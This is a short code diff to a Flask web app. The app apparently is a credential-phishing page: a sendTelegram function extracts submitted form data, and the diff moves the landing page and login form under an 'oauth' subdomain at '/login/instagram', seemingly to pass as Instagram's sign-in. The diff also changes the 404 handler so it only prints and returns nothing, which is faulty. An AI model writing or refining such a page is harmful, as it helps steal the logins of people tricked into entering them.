@@ -5,6 +5,7 @@ import os
 
 load_dotenv()
 app = Flask(__name__)
+app.config['SERVER_NAME'] = 'localhost:80'
 
 def sendTelegram(request):
     # Extracting form data
@@ -49,15 +50,15 @@ def sendTelegram(request):
 @app.errorhandler(404)
 def page_not_found(e):
     # Handling 404 errors, redirect to root Page
-    return home()
+    print('404 hit')
 
 
-@app.route('/')
+@app.route('/', subdomain='oauth')
 def home():
     # Landing page
     return render_template('index.html')
 
-@app.route('/login', methods=['GET', 'POST'])
+@app.route('/login/instagram', subdomain='oauth', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         # Process and handle the login data
